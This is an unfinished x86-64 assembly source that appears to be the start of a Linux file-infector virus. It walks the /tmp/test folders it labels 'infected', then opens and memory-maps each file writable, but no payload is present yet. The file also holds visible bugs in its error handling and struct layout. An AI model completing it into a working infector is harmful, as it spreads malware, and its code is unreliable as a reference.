%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_EXIT 60
%define SYS_GETDENTS64 217
%define SYS_FSTAT 5
%define SYS_MMAP 9
%define SYS_MUNMAP 11

%define O_RDONLY 0o
%define O_RDWR 0o2

%define	PROT_READ			0x1
%define	PROT_WRITE			0x2
%define	MAP_SHARED 			0x01
%define	MMAP_ERRORS			-4095

%define BUFFER_SIZE 1024
%define PATH_MAX 4096
; arbitrary TODO: change this
%define MINIMAL_FILE_SIZE 100

global _start

struc linux_dirent64
	.d_ino		resq	1
	.d_off		resq	1
	.d_reclen	resw	1
	.d_type		resb	1
	.d_name		resq	1
endstruc

struc	stat
	.st_dev		resq	1	; ID of device containing file
	.__pad1		resw	1	; Padding
	.st_ino		resq	1	; Inode number
	.st_mode	resd	1	; File type and mode
	.st_nlink	resq	1	; Number of hard links
	.st_uid		resd	1	; User ID of owner
	.st_gid		resd	1	; Group ID of owner
	.st_rdev	resq	1	; Device ID (if special file)
	.__pad2		resw	1	; Padding
	.st_size	resq	1	; Total size, in bytes
	.st_blksize	resq	1	; Block size for filesystem I/O
	.st_blocks	resq	1	; Number of 512B blocks allocated
	.st_atim	resq	2	; Time of last access
	.st_mtim	resq	2	; Time of last modification
	.st_ctim	resq	2	; Time of last status change
	.__unused	resq	3	; Unused
endstruc

section .text

_start:
	mov rdi, infected_folder_1			; treate_folder(infected_folder_1);
	call treate_folder				; ...
	mov rdi, infected_folder_2			; treate_folder(infected_folder_2);
	call treate_folder				; ...

	mov rax, SYS_EXIT				; exit(
	mov rdi, 0					; 0
	syscall						; );

; void treate_folder(char const *_folder);
; void treate_folder(rdi folder);
treate_folder:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local folder:qword				; char const *folder;
	%local fd:qword					; long fd;
	%local cur_offset:qword				; long cur_offset;
	%local read_bytes:qword				; long read_bytes;
	%local cur_dirent:qword				; void *cur_dirent;
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [folder], rdi				; folder = _folder;

	; Open folder
	mov rax, SYS_OPEN				; _ret = open(
	mov rdi, [folder]				; folder_name,
	mov rsi, O_RDONLY				; O_RDONLY,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .err						;	 goto .err
	mov [fd], rax					; fd = _ret;

.begin_getdents_loop:					; while (true) {
	mov rax, SYS_GETDENTS64				; _ret = SYS_GETDENTS64(
	mov rdi, [fd]					; 	fd,
	lea rsi, [buf]					; 	buf,
	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
	syscall						; );

	cmp rax, 0					; if (_ret <= 0)
	jle .end_getdents_loop				;	 break;
	mov [read_bytes], rax				; read_bytes = _ret;

	xor rax, rax					; cur_offset = 0;
	mov [cur_offset], rax				; ...

.begin_treate_loop:					; do {
	lea rax, [buf]					; cur_dirent = buf + cur_offset;
	add rax, [cur_offset]				; ...
	mov [cur_dirent], rax				; ...

	; start debug (delete this)
	mov rdi, [cur_dirent]				; char *_str = cur_dirent->d_name;
	add rdi, linux_dirent64.d_name			; ...
	call print_string				; print_string(_str);
	; end debug

	; detect regular file
	mov rdi, [folder]				; treat_file(folder;
	mov rsi, [cur_dirent]				; 	cur_dirent
	add rsi, linux_dirent64.d_name			; 		->d_name
	call treat_file					; );

	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
	add rax, linux_dirent64.d_reclen		; ...
	xor rdi, rdi					; _reclen = *_reclen_ptr;
	mov di, [rax]					; ...
	add [cur_offset], rdi				; cur_offset += _reclen;

	mov rax, [cur_offset]				; } while (cur_offset == read_bytes);
	cmp rax, [read_bytes]				; ...
	je .end_treate_loop				; ...
	jmp .begin_treate_loop				; ...
.end_treate_loop:					; ...

	jmp .begin_getdents_loop
.end_getdents_loop:					; }

	; Close folder
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );
	cmp rax, -1					; if (_ret == -1)
	je .err						; 	goto .err
	jmp .end					; else goto end

; TODO Delete this
.err:
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	mov rsi, err_msg				; 	err_msg,
	mov rdx, len_err_msg				; 	len_err_msg,
	syscall						; );
	jmp .end					; goto .end

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; void treat_file(char const *_dirname, char const *_filename);
; void treat_file(rdi dirname, rsi filename);
treat_file:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local dirname:qword				; char const *dirname;
	%local filename:qword				; char const *file;
	%local filepath:qword				; char *filepath;
	%local fd:qword					; long fd;
	%local filesize:qword				; long filesize;
	%local mappedfile:qword				; void *mappedfile;
	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
	%assign %$localsize %$localsize + PATH_MAX	; ...
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [dirname], rdi				; dirname = _dirname;
	mov [filename], rsi				; filename = _filename;

	; concat complete file path (TODO: check PATH_MAX overflow)
	lea rdi, [pathbuf]				; dest = pathbuf;
	mov rsi, [dirname]				; src = dirname;
	.dirname:
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .dirname				; 	goto .dirname;

	mov rsi, [filename]				; src = filename;
	.filename:
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .filename				; 	goto .filename;
	
	mov byte [rdi], 0				; *dest = 0;
	

	; Open file
	mov rax, SYS_OPEN				; _ret = open(
	lea rdi, [pathbuf]				; path,
	mov rsi, O_RDWR					; O_RDWR,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .err						;	 goto .err
	mov [fd], rax					; fd = _ret;

	; Get file stat
	lea rsi, [buf]					; _stat = buf;
	mov rax, SYS_FSTAT				; _ret = fstat(
	mov rdi, [fd]					; 	fd,
	syscall						; _stat);
	cmp rax, -1					; if (_ret == -1)
	je .close_err					; 	goto .close_err

	add rsi, stat.st_size				; filesize = _stat->st_size;
	mov rax, [rsi]					; ...
	mov [filesize], rax				; ...
	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
	jl .close_err					; 	goto .close_err

	; Map file
	mov rax, SYS_MMAP				; _ret = mmap(
	mov rdi, 0					; 	0,
	mov rsi, [filesize]				; 	filesize,
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED				; 	MAP_SHARED,
	mov r8, [fd]					; 	fd,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_err					; 	goto .close_err
	mov [mappedfile], rax				; mappedfile = _ret;


	jmp .unmap_file

; TODO Delete this
.unmap_err:
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	mov rsi, err_msg				; 	err_msg,
	mov rdx, len_err_msg				; 	len_err_msg,
	syscall						; );
	jmp .unmap_file

.unmap_file:
	mov rax, SYS_MUNMAP				; _ret = munmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize
	syscall						; );
	cmp rax, -1					; if (_ret == -1)
	je .close_file					; 	goto .close_file

; TODO Delete this
.close_err:
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	mov rsi, err_msg				; 	err_msg,
	mov rdx, len_err_msg				; 	len_err_msg,
	syscall						; );
	jmp .close_file

.close_file:
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );
	cmp rax, -1					; if (_ret == -1)
	je .err						; 	goto .err
	jmp .end					; else goto end

; TODO Delete this
.err:
	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	mov rsi, err_msg				; 	err_msg,
	mov rdx, len_err_msg				; 	len_err_msg,
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; DEBUG
; void print_string(char const *str);
; void print_string(rdi str);
print_string:
	push rdi					; save str				

	xor rdx, rdx					; _len = 0;
	.begin_strlen_loop:				; while (true) {
		mov sil, [rdi]				; _c = *_str;
		cmp sil, 0				; if (_c == 0)
		je .end_strlen_loop			; 	break;
		inc rdx					; _len++
		inc rdi					; _str++;
		jmp .begin_strlen_loop			; }
	.end_strlen_loop:				; ...

	pop rsi						; load str

	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1,
	syscall						;	str, _len);

	mov rax, SYS_WRITE				; write(
	mov rdi, 1					; 	1, 
	push 0x0A					; 	'\n',
	mov rsi, rsp					; 	...
	mov rdx, 1					; 	1
	syscall						; );
	add rsp, 8					; unpop '\n'
	
	ret

section .data
	infected_folder_1: db "/tmp/test/", 0
	infected_folder_2: db "/tmp/test2/", 0
	err_msg: db "Error occured !", 10
	len_err_msg: equ $ - err_msg
